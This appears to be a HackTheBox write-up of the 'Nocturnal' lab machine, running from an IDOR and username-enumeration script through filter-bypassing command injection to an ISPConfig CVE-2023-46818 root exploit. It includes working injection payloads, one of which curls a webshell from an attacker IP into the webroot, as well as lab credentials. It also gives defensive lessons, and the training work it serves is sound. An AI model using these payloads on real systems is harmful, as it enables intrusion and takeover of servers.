---
title: "Nocturnal"
date: 2025-05-03
type: docs
tags:
  - htb
  - linux
  - easy
  - idor
  - user-enumeration
  - command-injection
  - env-file
  - hashcat
  - ispconfig
  - cve-2023-46818
  - php-code-injection
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2025-05-03, **IP:** `10.10.11.64` → `nocturnal.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Register on the site; `view.php?username=X&file=Y` is an **IDOR**. You can read other users' uploaded files.
2. The `File does not exist.` vs no-response difference is a **username oracle**. Script it → `admin`, `amanda`. `amanda`'s stored file leaks a temp password `arHkG7HAI68X8s1J` ("set for all our services").
3. Log in as `amanda` → admin panel → the "backup" feature passes `password` into a shell command → **command injection** (`%0Abash …`) → shell as `www-data`.
4. Read `.env` for DB creds; the SQLite/MySQL DB has `tobias`'s hash → crack → SSH as **`tobias`**.
5. Internal **ISPConfig 3.2.x** on `:8080`, vulnerable to **CVE-2023-46818** (PHP code injection in the language editor as `admin`) → root.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `amanda` (leaked temp password) | `arHkG7HAI68X8s1J` |
| `tobias` (cracked DB hash) | see note (public writeups: `slowmotionapocalypse`) |
| ISPConfig `admin` | reuse `amanda`'s password |
| `user.txt` | `/home/tobias/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Nocturnal turned out to be one of my favorite chains to put together, because every step is a variation on the same root cause: the application trusts something coming from the client that it has no business trusting. I started with an **IDOR** in the file-viewing endpoint, which on its own would only let me read other people's uploads. What made it more interesting was noticing that the error message changed depending on whether the requested username actually existed, and the moment I saw that difference I knew I could turn a plain access control bug into a full **username enumeration oracle**. From there it's a small avalanche: a plaintext credential sitting in one of those leaked files, a **command injection** hidden inside an admin "backup" feature that I found by just probing the one input field that looked shell-adjacent, database credentials sitting in a `.env`, an offline **hash crack**, and finally an **N-day** quietly waiting on an internal ISPConfig instance that nobody had bothered to patch because "it's not exposed externally." My biggest takeaway from this box was reinforcing the habit of scripting an oracle the moment I spot one instead of guessing usernames by hand, since that shift in workflow is the difference between a five-minute enumeration and an hour of manual trial and error.

Related IDOR boxes: [Drive](/writeups/hackthebox/linux/hard/drive/), [Road](/writeups/tryhackme/linux/easy/road/). Related username oracles: [Dog](/writeups/hackthebox/linux/easy/dog/), [Previse](/writeups/hackthebox/linux/easy/previse/). Related `.env` / DB-hash-crack: [Cat](/writeups/hackthebox/linux/medium/cat/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/). Related internal-service N-day → root: [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Monitored](/writeups/hackthebox/linux/medium/monitored/).

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-enum:
|_  /login.php: Possible admin folder
```

(I've trimmed the SSH and nginx `vulners` script dumps here since neither turned up anything actionable.)

### IDOR → username oracle

Once I had an account registered, I turned my attention to the file upload feature. My first instinct was to see if I could get a payload to execute directly, so I tried a handful of extension and content-type tricks to slip past whatever validation was sitting behind it. None of that got me code execution, but while I was poking around the upload and retrieval flow, one URL structure caught my eye:

```
http://nocturnal.htb/view.php?username=baphomet&file=rev.pdf
```

<div class="callout callout-note">

**IDOR → enumeration**

What struck me immediately was that `view.php` accepts both `username` **and** `file` as parameters, and nowhere does it check that the session making the request actually owns the file it's asking for. That's a textbook Insecure Direct Object Reference: swap in any username and I could pull back whatever that account had stored on disk. Then, while testing usernames that didn't exist against ones that did, I noticed something even more useful: the response body wasn't the same in both cases. A valid username with a missing file returned `File does not exist.`, while an invalid username came back with a redirect or an empty body. That inconsistency is a **username oracle** waiting to be automated, so my plan was simple: throw a wordlist of usernames at the endpoint and keep every one that echoed `File does not exist.` back at me.

</div>

Rather than burn time checking names by hand, I put together a quick Python script to drive the oracle at scale:

```python
#!/usr/bin/python3
from pwn import *
import requests, signal, sys

wordlist = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
cookie = sys.argv[1]
found = []
for username in open(wordlist):
    username = username.strip()
    r = requests.get(f"http://nocturnal.htb/view.php?username={username}&file=pwn.xlsx",
                     cookies={'PHPSESSID': cookie})
    if "File does not exist." in r.text:
        found.append(username); print(found)
    sleep(0.5)
```

Running that against the seclists username wordlist turned up exactly two valid accounts: `admin` and `amanda`. Since `amanda` already had a file sitting in her history, I pulled it down and got exactly the kind of gift I was hoping for:

```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J.
This password has been set for all our services...
```

### Command injection in the admin "backup"

With `amanda`'s temporary password in hand, I logged into the application and found she had access to an admin panel that wasn't reachable as a regular user. Inside was a "backup" feature that let you set a password on the resulting archive, and the moment I saw a password field feeding into what was obviously a shell command under the hood, I wanted to see how far I could push it:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
Cookie: PHPSESSID=jan6orq2ilehsuu1ebbal3trrq
Content-Type: application/x-www-form-urlencoded

password=%0Abash-c%09"id"&backup=
```

<div class="callout callout-note">

**Newline + tab injection**

Digging into the response behavior, I worked out that the backend is almost certainly building something like `zip -P <password> backup.zip..` and handing it straight to the shell. Whoever wrote the input filter clearly thought about the obvious command separators, since spaces, semicolons, pipes, and ampersands are all blocked. What they missed is **`%0A`, a literal newline**, which terminates the current command just as effectively as a semicolon would, and **`%09`, a tab character**, which the shell happily accepts as an argument separator wherever a blocked space would normally go. That combination is enough to smuggle a fully working second command through the same field. I used it to pull a webshell down from my attacking machine and drop it straight into the webroot, then fired a follow-up request to run it. It's a classic case of a blacklist that catches every metacharacter someone thought to test and forgets that whitespace comes in more than one flavor.

</div>

```http
password=%0Abash-c%09"curl%09http://10.10.14.205:8000/rev.php%09-o%09rev.php"&backup=
```

That second request came back clean, and I had a working shell as `www-data`.

<div class="callout callout-note">

**From www-data to root: credentials, cracking, and an internal N-day**

My notes up to the initial foothold were detailed, but this next stretch, from `www-data` to `tobias` to root, is worth walking through in full rather than just listing commands.

**1. Finding database credentials and cracking a hash.** With a shell as `www-data`, my next move was hunting for anything that looked like stored credentials, since I now had filesystem access instead of just a web-facing injection point. I found `/var/www/nocturnal_database/nocturnal_database.db`, a SQLite database, alongside the application's `.env` file, either of which gave me a path into the app's data layer. The `users` table held a password hash for `tobias`, so I pulled it down and threw it at `hashcat -m 0`. It cracked quickly enough that I'd guess it wasn't a particularly strong password to begin with; public writeups on this box record the result as `slowmotionapocalypse`. With that in hand, SSH access was trivial:
```bash
ssh tobias@nocturnal.htb
```

**2. Pivoting to an internal ISPConfig instance via CVE-2023-46818.** Once I was on the box as `tobias`, I went looking for services that weren't exposed externally, on the theory that internal-only software tends to get patched less aggressively simply because nobody expects an attacker to reach it. Sure enough, there was an ISPConfig control panel bound to `:8080` on localhost. I forwarded it over my existing SSH session so I could reach it from my own browser:
```bash
ssh -L 8081:localhost:8080 tobias@nocturnal.htb
```
Since I already had `amanda`'s password from the leaked file, and the letter had told me outright that it was reused "for all our services," I tried it against the ISPConfig `admin` login before trying anything else, and it worked immediately. That credential reuse was exactly what made the earlier enumeration step worth the effort. From there I recognized the ISPConfig build as vulnerable to **CVE-2023-46818**, a PHP code injection flaw affecting versions up to 3.2.11 in which the built-in `admin` role can inject arbitrary PHP through the **language file editor**; the `records` and `lang` parameters aren't sanitized before being passed into an `eval()` call. I used the public proof-of-concept to get code execution:
```bash
python3 CVE-2023-46818.py http://localhost:8081/ admin arHkG7HAI68X8s1J
ISPConfig> cat /root/root.txt
```
On this box, ISPConfig's web process runs as root, so the moment that PHP executed, I had root-level code execution and could read the flag directly.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/tobias/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **Enforce object ownership on every endpoint that touches user data**, not just authentication. `view.php` checked that a session existed, but it never checked that the session belonged to the same user as the file being requested. The fix is a single extra query: confirm the authenticated user's ID matches the resource owner before returning anything, on every `view`/`download`/`edit` route, not only the ones someone remembered to protect.
- **Don't let error messages leak existence.** The instant an application returns a different response for "record exists but you can't have it" versus "record doesn't exist," it hands an attacker a free oracle. I lean on this pattern constantly during enumeration precisely because so many applications get it wrong; the fix is to return an identical, generic response for both cases regardless of what actually happened server-side.
- **Never build shell commands by string concatenation.** Blacklisting characters is a losing game. I got past this one with a newline and a tab, and there's always another whitespace variant, encoding trick, or metacharacter waiting to be found. Anything that has to shell out should use an `execve`-style argument array so the shell never gets a chance to re-parse the string, with strict allowlisting on top rather than a blacklist trying to chase a moving target.
- **Treat `.env` files as high-value targets, both as attacker and defender.** As an attacker, dumping one is often the fastest route from a foothold to database credentials. As a defender, keep them outside the web root with restrictive file permissions, and don't assume "nothing links to it" counts as protection once someone has any form of code execution.
- **Patch internal-only services on the same schedule as external ones.** ISPConfig sitting unpatched on `:8080` only mattered once I already had a shell, but that's exactly the scenario network segmentation is supposed to slow down, not the scenario it's supposed to ignore. CVE-2023-46818 sat there for the taking because someone assumed "internal" meant "safe."
- **Stop reusing credentials across services**, even temporary ones. The letter to `amanda` says the quiet part out loud: "this password has been set for all our services." That single sentence is what let a leaked web-app password double as a valid ISPConfig admin login, turning one weak link into a second complete foothold.

---

## Related Writeups

- **IDOR / broken access control:** [Drive](/writeups/hackthebox/linux/hard/drive/), [Road](/writeups/tryhackme/linux/easy/road/)
- **Username / existence oracles:** [Dog](/writeups/hackthebox/linux/easy/dog/), [Previse](/writeups/hackthebox/linux/easy/previse/)
- **Command injection via missing whitespace filter:** [Previse](/writeups/hackthebox/linux/easy/previse/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/)
- **`.env` → DB hash → crack:** [Cat](/writeups/hackthebox/linux/medium/cat/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Internal N-day → root:** [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Monitored](/writeups/hackthebox/linux/medium/monitored/)

## References

- CVE-2023-46818 (ISPConfig) <https://nvd.nist.gov/vuln/detail/CVE-2023-46818>
- ISPConfig advisory <https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/>
- OWASP IDOR <https://owasp.org/www-project-web-security-testing-guide/>
